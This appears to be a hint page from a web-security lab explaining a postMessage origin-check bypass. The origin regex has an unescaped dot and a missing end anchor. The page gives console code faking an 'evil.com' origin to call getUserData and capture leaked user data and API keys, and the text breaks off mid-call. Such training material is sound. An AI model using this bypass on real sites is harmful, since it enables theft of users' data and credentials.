Hint: Regex Origin Bypass

The postMessage handler validates origin with a regex. But the regex has TWO classic mistakes that let you bypass it from your own domain. Based on Microsoft MSRC research.
1
Find the regex pattern›
Beautify the minified code. The pattern is: 
var TRUSTED_PATTERN = /^https?:\/\/([a-z0-9-]+\.)*teamsync.io/;
Two bugs are hiding in this regex.
2
Bug 1: unescaped dot›
The dot in teamsync.io is unescaped. In regex, . matches ANY character. So teamsyncXio passes. An attacker registers teamsyncXio.evil.com.
3
Bug 2: missing $ anchor›
No $ at the end. The regex checks the START of the origin but not the END. https://teamsync.io.evil.com passes because the regex matches the prefix.
4
Exploit locally›
For local testing, you can simulate by running in the console — the handler passes messages from any origin matching the regex. Or manually call the handler with a faked event. The key is proving the regex allows unintended origins and the getUserData action leaks sensitive data + API keys.

Prove the regex is broken (in console):

var regex = /^https?:\/\/([a-z0-9-]+\.)*teamsync.io/;

// These should NOT match but DO:
console.log(regex.test("https://teamsyncXio.evil.com"));  // true!
console.log(regex.test("https://teamsync.io.evil.com"));   // true!
console.log(regex.test("https://sub.teamsync.io.attacker.com")); // true!

Trigger data exfil (simulating attacker origin):

// Listen for the leaked data
window.addEventListener('message', e => {
  if (e.data && e.data.type === 'ts:userData') {
    alert('STOLEN: ' + JSON.stringify(e.data));
  }
});
// The handler sends data to event.source with targetOrigin: *
// So even from this console, request the data:
IntegrationBridge.handleMessage({
  origin: 'https://teamsync.io.evil.com',
  data: {action: 'getUserData'},
  source: window
